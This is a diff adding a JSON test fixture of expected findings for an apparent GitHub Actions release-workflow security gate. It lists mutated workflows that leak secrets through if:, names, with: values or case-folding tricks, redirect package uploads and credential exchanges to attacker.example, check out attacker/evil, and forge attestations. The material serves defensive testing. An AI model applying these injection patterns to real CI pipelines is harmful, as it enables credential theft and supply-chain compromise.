+  "M2 github['token'] as CLOUDFLARE_ACCOUNT_ID": [
+    "sdk-publish.yml: publish-go step injected: github['token']: an index ([…]) into a context",
+    "sdk-publish.yml: publish-go: a credentialed job's env: CLOUDFLARE_ACCOUNT_ID is ${{ github['token'] }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: step injected sets the credential CLOUDFLARE_ACCOUNT_ID but its run: does not read it"
+  ],
+  "M3 secrets[X] in packagist": [
+    "sdk-publish.yml: publish-packagist step injected: secrets['GO_TAG_DEPLOY_KEY']: an index ([…]) into a context",
+    "sdk-publish.yml: publish-packagist: a credentialed job's env: DOTNET_NOLOGO is ${{ secrets['GO_TAG_DEPLOY_KEY'] }}, not its pinned expression",
+    "sdk-publish.yml: publish-packagist: reads secret GO_TAG_DEPLOY_KEY, which environment sdk-publish-packagist does not declare"
+  ],
+  "M4 steps['x'].outputs": [
+    "sdk-publish.yml: publish-go step injected: steps['inj'].outputs.y: an index ([…]) into a context",
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ steps['inj'].outputs.y }}, not its pinned expression"
+  ],
+  "M5 env['DEPLOY_KEY'] at job": [
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ env['DEPLOY_KEY'] }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: env['DEPLOY_KEY']: an index ([…]) into a context"
+  ],
+  "Q1 fromJSON(toJSON(secrets)).X into a tag": [
+    "sdk-publish.yml: publish-go step injected: fromJSON(toJSON(secrets)).SOME_ORG_SECRET: toJSON, fromJSON, format and join are refused",
+    "sdk-publish.yml: publish-go: a credentialed job's env: CLOUDFLARE_ACCOUNT_ID is ${{ fromJSON(toJSON(secrets)).SOME_ORG_SECRET }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: step injected runs git without GIT_CONFIG_GLOBAL: /dev/null in its own env",
+    "sdk-publish.yml: publish-go: step injected runs git without GIT_CONFIG_NOSYSTEM: 1 in its own env"
+  ],
+  "Q3 github['token'] in the Upload job's env": [
+    "sdk-publish.yml: publish-go: a credentialed job's env: CLOUDFLARE_ACCOUNT_ID is ${{ github['token'] }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: github['token']: an index ([…]) into a context",
+    "sdk-publish.yml: publish-go: the credential CLOUDFLARE_ACCOUNT_ID is set in the job's env; only the env: of the step that reads it may set it"
+  ],
+  "Q4 packagist Upload: fromJSON(toJSON(secrets)).X": [
+    "sdk-publish.yml: publish-packagist step Upload: fromJSON(toJSON(secrets)).X: toJSON, fromJSON, format and join are refused",
+    "sdk-publish.yml: publish-packagist: a credentialed job's env: CLOUDFLARE_ACCOUNT_ID is ${{ fromJSON(toJSON(secrets)).X }}, not its pinned expression",
+    "sdk-publish.yml: publish-packagist: step Upload sets the credential CLOUDFLARE_ACCOUNT_ID but its run: does not read it"
+  ],
+  "R1 needs['x'] (rule 16)": [
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ needs['nosuchjob'].outputs.nothing }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: needs['nosuchjob'].outputs.nothing: an index ([…]) into a context"
+  ],
+  "a literal value for an allowed name": [
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: DOTNET_NOLOGO is 0, not its pinned expression"
+  ],
+  "a secret in a name pinned to a literal": [
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: DOTNET_NOLOGO is ${{ secrets.MIRROR_DEPLOY_KEY }}, not its pinned expression",
+    "sdk-publish.yml: publish-nuget: reads secret MIRROR_DEPLOY_KEY, which environment sdk-publish-nuget does not declare",
+    "sdk-publish.yml: publish-nuget: secrets.MIRROR_DEPLOY_KEY: environment sdk-publish-nuget declares no secret MIRROR_DEPLOY_KEY"
+  ],
+  "another pack job's artifact name": [
+    "sdk-publish.yml: publish-npm: a credentialed job's env: ARTIFACT is ${{ needs.pack-pypi.outputs.file }}, not its pinned expression",
+    "sdk-publish.yml: publish-npm: needs.pack-pypi.outputs.file: publish-npm does not need pack-pypi"
+  ],
+  "a bare context": [
+    "sdk-publish.yml: publish-go: a credentialed job's env: DOTNET_NOLOGO is ${{ secrets }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: secrets: the bare secrets context"
+  ],
+  "L4 ../ out of the module": [
+    "sdk-publish.yml: publish-go step injected: a credentialed job runs `curl -fsS --proto =https \"https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/../../../../../../attacker.example/x/@v/list\"`: curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly"
+  ],
+  "L4c a query": [
+    "sdk-publish.yml: publish-go step injected: a credentialed job runs `curl -fsS --proto =https \"https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v1.info?x=1\"`: curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly"
+  ],
+  "L4d %2e": [
+    "sdk-publish.yml: publish-go step injected: a credentialed job runs `curl -fsS --proto =https \"https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/%2e%2e/%2e%2e/x\"`: curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly"
+  ],
+  "L4e @ userinfo": [
+    "sdk-publish.yml: publish-go step injected: a credentialed job runs `curl -fsS --proto =https \"https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/@attacker.example/\"`: curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly"
+  ],
+  "the module's list, not its version": [
+    "sdk-publish.yml: publish-go step injected: a credentialed job runs `curl -fsS --proto =https \"https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/list\"`: curl reaches only https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/v${UNIT_VERSION}.info, exactly"
+  ],
+  "a secret the job's environment does not declare": [
+    "sdk-publish.yml: publish-go step Install the deploy key: a credentialed job runs `printf '%s\\n' \"$DEPLOY_KEY\"`: it reads the credential DEPLOY_KEY outside its recorded position",
+    "sdk-publish.yml: publish-go step Install the deploy key: secrets.MIRROR_DEPLOY_KEY: environment sdk-publish-go declares no secret MIRROR_DEPLOY_KEY",
+    "sdk-publish.yml: publish-go: a credentialed job's env: DEPLOY_KEY is ${{ secrets.MIRROR_DEPLOY_KEY }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: reads secret MIRROR_DEPLOY_KEY, which environment sdk-publish-go does not declare"
+  ],
+  "a secret in a job outside an environment": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): secrets.GO_TAG_DEPLOY_KEY: a job outside an environment declares no secret GO_TAG_DEPLOY_KEY",
+    "sdk-publish.yml: setup: reads the secrets context outside an environment"
+  ],
+  "a variable nobody recorded": [
+    "sdk-publish.yml: publish-nuget step Exchange the OIDC token: vars.OTHER: RELEASE_VARS records no variable OTHER",
+    "sdk-publish.yml: publish-nuget: action 3 is {\"id\":\"login\",\"uses\":\"NuGet/login@8d196754b4036150537f80ac539e15c2f1028841\",\"with\":{\"user\":\"${{ vars.OTHER }}\"}}, ACTION_SURFACE records {\"id\":\"login\",\"uses\":\"NuGet/login@8d196754b4036150537f80ac539e15c2f1028841\",\"with\":{\"user\":\"${{ vars.NUGET_USER }}\"}}"
+  ],
+  "a matrix reference": [
+    "sdk-publish.yml: pack-npm: env UNIT_VERSION is ${{ matrix.version }}, not an exact version",
+    "sdk-publish.yml: pack-npm: matrix.version: the release workflows use no matrix"
+  ],
+  "the workflow env reading a job's output": [
+    "sdk-publish.yml: -: needs.setup.outputs.path: the workflow's env cannot read the needs context",
+    "sdk-publish.yml: publish-crates: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-go: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-maven: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-npm: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-packagist: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-pubdev: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-pypi: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-rubygems: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow",
+    "sdk-publish.yml: publish-swiftpm: a credentialed job's env: it sets EXTRA, which CREDENTIALED_ENV does not allow"
+  ],
+  "TOJSON(SECRETS) in upper case": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): TOJSON(SECRETS): toJSON, fromJSON, format and join are refused",
+    "sdk-publish.yml: setup: reads the secrets context outside an environment"
+  ],
+  "SECRETS.X in upper case, outside an environment": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): SECRETS.GO_TAG_DEPLOY_KEY: write the context in lower case (GitHub folds case, this check reads it exactly)",
+    "sdk-publish.yml: setup: reads the secrets context outside an environment"
+  ],
+  "GITHUB.TOKEN in upper case": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): GITHUB.TOKEN: write the context in lower case (GitHub folds case, this check reads it exactly)"
+  ],
+  "a `}}` inside a string hiding toJSON(secrets)": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): ('}}' && '') || toJSON(secrets): toJSON, fromJSON, format and join are refused",
+    "sdk-publish.yml: setup: reads the secrets context outside an environment"
+  ],
+  "a '' escape inside the string": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): ('it''s }}' && '') || toJSON(secrets): toJSON, fromJSON, format and join are refused",
+    "sdk-publish.yml: setup: reads the secrets context outside an environment"
+  ],
+  "a non-ASCII letter (Cyrillic s) in a context name": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): ѕecrets.X: a non-ASCII character in an expression"
+  ],
+  "an if: reading SECRETS outside an environment": [
+    "sdk-publish.yml: setup step Resolve the publish unit (tools/sdk-pack/resolve-publish.mjs): SECRETS.X: write the context in lower case (GitHub folds case, this check reads it exactly)",
+    "sdk-publish.yml: setup: reads the secrets context outside an environment"
+  ],
+  "a step if: leaking a bit of R2_SECRET_ACCESS_KEY": [
+    "cli-release.yml: upload step Upload v<ver>/ to R2: env.R2_SECRET_ACCESS_KEY: the credential R2_SECRET_ACCESS_KEY is read only by a run: block",
+    "cli-release.yml: upload: step Upload v<ver>/ to R2's if: ${{ startsWith(env.R2_SECRET_ACCESS_KEY, '0') }} is not a recorded condition (skipped-vs-ran is public)"
+  ],
+  "the same if: written bare": [
+    "cli-release.yml: upload step Upload v<ver>/ to R2: env.R2_SECRET_ACCESS_KEY: the credential R2_SECRET_ACCESS_KEY is read only by a run: block",
+    "cli-release.yml: upload: step Upload v<ver>/ to R2's if: startsWith(env.R2_SECRET_ACCESS_KEY, '0') is not a recorded condition (skipped-vs-ran is public)"
+  ],
+  "continue-on-error from a secret": [
+    "cli-release.yml: upload step Upload v<ver>/ to R2: secrets.R2_SECRET_ACCESS_KEY: a secret is read only in an env: value (an if:, a name or a with: would carry it out)",
+    "cli-release.yml: upload: step Upload v<ver>/ to R2's continue-on-error: holds an expression"
+  ],
+  "timeout-minutes from a secret": [
+    "cli-release.yml: upload step Upload v<ver>/ to R2: secrets.R2_SECRET_ACCESS_KEY: a secret is read only in an env: value (an if:, a name or a with: would carry it out)",
+    "cli-release.yml: upload: step Upload v<ver>/ to R2's timeout-minutes: holds an expression"
+  ],
+  "a step name carrying the value": [
+    "cli-release.yml: upload step Upload ${{ env.R2_SECRET_ACCESS_KEY }}: env.R2_SECRET_ACCESS_KEY: the credential R2_SECRET_ACCESS_KEY is read only by a run: block",
+    "cli-release.yml: upload: step Upload ${{ env.R2_SECRET_ACCESS_KEY }}'s name: holds an expression"
+  ],
+  "a with: carrying a secret": [
+    "cli-release.yml: upload step Receive the build: secrets.R2_SECRET_ACCESS_KEY: a secret is read only in an env: value (an if:, a name or a with: would carry it out)",
+    "cli-release.yml: upload: action 2 is {\"uses\":\"actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\",\"with\":{\"name\":\"${{ secrets.R2_SECRET_ACCESS_KEY }}\",\"path\":\"dist\"}}, ACTION_SURFACE records {\"uses\":\"actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\",\"with\":{\"name\":\"cli-dist\",\"path\":\"dist\"}}"
+  ],
+  "F1 environment.url from a job-level credential": [
+    "cli-release.yml: upload: a credentialed job's environment: holds an expression",
+    "cli-release.yml: upload: a credentialed job's environment: is a literal name (its url: would carry an expression out)",
+    "cli-release.yml: upload: env.R2_SECRET_ACCESS_KEY: the credential R2_SECRET_ACCESS_KEY is read only by a run: block",
+    "cli-release.yml: upload: the credential R2_SECRET_ACCESS_KEY is set in the job's env; only the env: of the step that reads it may set it"
+  ],
+  "A11/E1 a credential moved to the job env": [
+    "cli-release.yml: upload: the credential R2_SECRET_ACCESS_KEY is set in the job's env; only the env: of the step that reads it may set it"
+  ],
+  "a credential set on a step whose run: does not read it": [
+    "sdk-publish.yml: publish-go: step Upload sets the credential DEPLOY_KEY but its run: does not read it"
+  ],
+  "F3 an upper-case if: on the upload step": [
+    "cli-release.yml: upload step Upload v<ver>/ to R2: contains(TOJSON(SECRETS), 'a'): toJSON, fromJSON, format and join are refused",
+    "cli-release.yml: upload: step Upload v<ver>/ to R2's if: contains(TOJSON(SECRETS), 'a') is not a recorded condition (skipped-vs-ran is public)"
+  ],
+  "a job if: reading env": [
+    "sdk-publish.yml: publish-npm: a credentialed job's if: does not require a tag push (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/'), top-level conjuncts, no || or !)",
+    "sdk-publish.yml: publish-npm: a credentialed job's if: reads more than needs. and github. (always() && needs.pack-npm.result == 'success' && github.event_name == 'push' && startsWith(github.ref, 'refs/tags/') && env.NPM_VERSION != '')"
+  ],
+  "a job timeout from an expression": [
+    "sdk-publish.yml: publish-npm: a credentialed job's timeout-minutes: holds an expression"
+  ],
+  "MAVEN_R2_ACCESS_KEY_ID from another declared secret": [
+    "sdk-publish.yml: publish-maven: a credentialed job's env: MAVEN_R2_ACCESS_KEY_ID is ${{ secrets.MAVEN_R2_SECRET_ACCESS_KEY }}, not its pinned expression"
+  ],
+  "the Go DEPLOY_KEY from the mirrors' secret": [
+    "sdk-publish.yml: publish-go step Install the deploy key: a credentialed job runs `printf '%s\\n' \"$DEPLOY_KEY\"`: it reads the credential DEPLOY_KEY outside its recorded position",
+    "sdk-publish.yml: publish-go step Install the deploy key: secrets.MIRROR_DEPLOY_KEY: environment sdk-publish-go declares no secret MIRROR_DEPLOY_KEY",
+    "sdk-publish.yml: publish-go: a credentialed job's env: DEPLOY_KEY is ${{ secrets.MIRROR_DEPLOY_KEY }}, not its pinned expression",
+    "sdk-publish.yml: publish-go: reads secret MIRROR_DEPLOY_KEY, which environment sdk-publish-go does not declare"
+  ],
+  "another known host": [
+    "sdk-publish.yml: publish-crates: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-go: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-maven: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-npm: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-nuget: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-packagist: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-pubdev: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-pypi: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-rubygems: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression",
+    "sdk-publish.yml: publish-swiftpm: a credentialed job's env: GITHUB_SSH_KNOWN_HOST is github.com ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEVIL, not its pinned expression"
+  ],
+  "C1 pypi repository-url to an attacker": [
+    "sdk-publish.yml: publish-pypi: action 2 is {\"uses\":\"pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33\",\"with\":{\"packages-dir\":\"release/\",\"repository-url\":\"https://attacker.example/legacy/\"}}, ACTION_SURFACE records {\"uses\":\"pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33\",\"with\":{\"packages-dir\":\"release/\"}}"
+  ],
+  "C2 rubygems gem-server to an attacker": [
+    "sdk-publish.yml: publish-rubygems: action 2 is {\"uses\":\"rubygems/configure-rubygems-credentials@dc5a8d8553e6ee01fc26761a49e99e733d17954a\",\"with\":{\"gem-server\":\"https://attacker.example\"}}, ACTION_SURFACE records {\"uses\":\"rubygems/configure-rubygems-credentials@dc5a8d8553e6ee01fc26761a49e99e733d17954a\"}"
+  ],
+  "C2b rubygems audience override": [
+    "sdk-publish.yml: publish-rubygems: action 2 is {\"uses\":\"rubygems/configure-rubygems-credentials@dc5a8d8553e6ee01fc26761a49e99e733d17954a\",\"with\":{\"audience\":\"attacker.example\"}}, ACTION_SURFACE records {\"uses\":\"rubygems/configure-rubygems-credentials@dc5a8d8553e6ee01fc26761a49e99e733d17954a\"}"
+  ],
+  "C3 maven checkout of another repository": [
+    "sdk-publish.yml: publish-maven: action 1 is {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false,\"ref\":\"main\",\"repository\":\"attacker/evil\"}}, ACTION_SURFACE records {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false}}"
+  ],
+  "C4 cli upload checkout of another repository": [
+    "cli-release.yml: upload: action 1 is {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false,\"repository\":\"attacker/evil\"}}, ACTION_SURFACE records {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false}}"
+  ],
+  "C4b cli promote checkout of a pull request": [
+    "cli-release.yml: promote: action 1 is {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false,\"ref\":\"refs/pull/1/head\"}}, ACTION_SURFACE records {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false}}"
+  ],
+  "C5 crates checkout of a pull request": [
+    "sdk-publish.yml: publish-crates: action 1 is {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false,\"ref\":\"refs/pull/1/head\"}}, ACTION_SURFACE records {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"fetch-depth\":1,\"persist-credentials\":false}}"
+  ],
+  "C6 pypa inside the NuGet job, with its key": [
+    "sdk-publish.yml: publish-nuget step inj: steps.login.outputs.NUGET_API_KEY: the credential output of NuGet/login is read only in an env: value",
+    "sdk-publish.yml: publish-nuget: action 4 is {\"uses\":\"pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33\",\"with\":{\"packages-dir\":\"release/\",\"password\":\"${{ steps.login.outputs.NUGET_API_KEY }}\",\"repository-url\":\"https://attacker.example/legacy/\",\"user\":\"x\"}}, ACTION_SURFACE records null",
+    "sdk-publish.yml: publish-nuget: runs 4 actions, ACTION_SURFACE records 3"
+  ],
+  "C6b a checkout with the crates token": [
+    "sdk-publish.yml: publish-crates step inj: steps.auth.outputs.token: the credential output of rust-lang/crates-io-auth-action is read only in an env: value",
+    "sdk-publish.yml: publish-crates: action 3 is {\"uses\":\"actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5\",\"with\":{\"persist-credentials\":false,\"repository\":\"attacker/evil\",\"token\":\"${{ steps.auth.outputs.token }}\"}}, ACTION_SURFACE records null",
+    "sdk-publish.yml: publish-crates: runs 3 actions, ACTION_SURFACE records 2"
+  ],
+  "C7 maven attestation subject forged": [
+    "sdk-publish.yml: publish-maven: action 3 is {\"uses\":\"actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\",\"with\":{\"subject-digest\":\"sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\"subject-name\":\"pkg:maven/io.confeature/sdk@9.9.9\"}}, ACTION_SURFACE records {\"uses\":\"actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\",\"with\":{\"subject-checksums\":\"publish-tmp/subjects.sha256\"}}"
+  ],
+  "C7b maven attestation pushed to a registry": [
+    "sdk-publish.yml: publish-maven: action 3 is {\"uses\":\"actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\",\"with\":{\"push-to-registry\":true,\"subject-checksums\":\"publish-tmp/subjects.sha256\",\"subject-name\":\"ghcr.io/attacker/x\"}}, ACTION_SURFACE records {\"uses\":\"actions/attest-build-provenance@4d101475d8b20a2381f78447822ac1eab6504dd8\",\"with\":{\"subject-checksums\":\"publish-tmp/subjects.sha256\"}}"
+  ],
+  "C11 setup-node's registry-url to an attacker": [
+    "sdk-publish.yml: publish-npm: action 1 is {\"uses\":\"actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020\",\"with\":{\"node-version\":\"${{ env.NODE_VERSION }}\",\"registry-url\":\"https://attacker.example/\"}}, ACTION_SURFACE records {\"uses\":\"actions/setup-node@49933ea5288caeca8642d1e84afbd3f7d6820020\",\"with\":{\"node-version\":\"${{ env.NODE_VERSION }}\",\"registry-url\":\"https://registry.npmjs.org/\"}}"
+  ],
+  "C12 download-artifact of every artifact of the run": [
+    "sdk-publish.yml: publish-maven: action 2 is {\"uses\":\"actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\",\"with\":{\"merge-multiple\":true,\"path\":\"release\",\"pattern\":\"*\"}}, ACTION_SURFACE records {\"uses\":\"actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\",\"with\":{\"name\":\"release-maven\",\"path\":\"release\"}}"
+  ],
+  "C13 pypi packages-dir /": [
+    "sdk-publish.yml: publish-pypi: action 2 is {\"uses\":\"pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33\",\"with\":{\"packages-dir\":\"/\"}}, ACTION_SURFACE records {\"uses\":\"pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33\",\"with\":{\"packages-dir\":\"release/\"}}"
+  ],
+  "C14 NuGet login user from the event": [
+    "sdk-publish.yml: publish-nuget: action 3 is {\"id\":\"login\",\"uses\":\"NuGet/login@8d196754b4036150537f80ac539e15c2f1028841\",\"with\":{\"user\":\"${{ github.event.head_commit.author.name }}\"}}, ACTION_SURFACE records {\"id\":\"login\",\"uses\":\"NuGet/login@8d196754b4036150537f80ac539e15c2f1028841\",\"with\":{\"user\":\"${{ vars.NUGET_USER }}\"}}"
+  ],
+  "C17 a credentialed job's continue-on-error: true": [
+    "sdk-publish.yml: publish-go: a credentialed job sets continue-on-error: (its failure would be reported green)"
+  ],
+  "C18 crates-io-auth-action url to an attacker": [
+    "sdk-publish.yml: publish-crates: action 2 is {\"id\":\"auth\",\"uses\":\"rust-lang/crates-io-auth-action@c6f97d42243bad5fab37ca0427f495c86d5b1a18\",\"with\":{\"url\":\"https://attacker.example\"}}, ACTION_SURFACE records {\"id\":\"auth\",\"uses\":\"rust-lang/crates-io-auth-action@c6f97d42243bad5fab37ca0427f495c86d5b1a18\"}"
+  ],
+  "C19 NuGet/login token-service-url to an attacker": [
+    "sdk-publish.yml: publish-nuget: action 3 is {\"id\":\"login\",\"uses\":\"NuGet/login@8d196754b4036150537f80ac539e15c2f1028841\",\"with\":{\"token-service-url\":\"https://attacker.example/token\",\"user\":\"${{ vars.NUGET_USER }}\"}}, ACTION_SURFACE records {\"id\":\"login\",\"uses\":\"NuGet/login@8d196754b4036150537f80ac539e15c2f1028841\",\"with\":{\"user\":\"${{ vars.NUGET_USER }}\"}}"
+  ],
+  "D4 the NuGet key as a download-artifact name": [
+    "sdk-publish.yml: publish-nuget step inj: steps.login.outputs.NUGET_API_KEY: the credential output of NuGet/login is read only in an env: value",
+    "sdk-publish.yml: publish-nuget: action 4 is {\"uses\":\"actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093\",\"with\":{\"name\":\"${{ steps.login.outputs.NUGET_API_KEY }}\",\"path\":\"release\"}}, ACTION_SURFACE records null",
+    "sdk-publish.yml: publish-nuget: runs 4 actions, ACTION_SURFACE records 3"
+  ],
+  "an action step removed": [
+    "sdk-publish.yml: publish-pypi: action 2 is null, ACTION_SURFACE records {\"uses\":\"pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33\",\"with\":{\"packages-dir\":\"release/\"}}",
+    "sdk-publish.yml: publish-pypi: runs 1 actions, ACTION_SURFACE records 2",
+    "tools/repo-gates/release-settings.json: -: allows pypa/gh-action-pypi-publish@*, which no workflow uses"
+  ],
+  "an id changed": [
+    "sdk-publish.yml: publish-nuget step Upload: steps.login.outputs.NUGET_API_KEY: no earlier step of publish-nuget has id login",
+    "sdk-publish.yml: publish-nuget: action 3 is {\"id\":\"other\",\"uses\":\"NuGet/login@8d196754b4036150537f80ac539e15c2f1028841\",\"with\":{\"user\":\"${{ vars.NUGET_USER }}\"}}, ACTION_SURFACE records {\"id\":\"login\",\"uses\":\"NuGet/login@8d196754b4036150537f80ac539e15c2f1028841\",\"with\":{\"user\":\"${{ vars.NUGET_USER }}\"}}"
+  ],
+  "D2 a credential on a step that reads it only in a comment": [
+    "sdk-publish.yml: publish-go: step Ask the Go proxy for the release sets the credential DEPLOY_KEY but its run: does not read it"
+  ]
+}
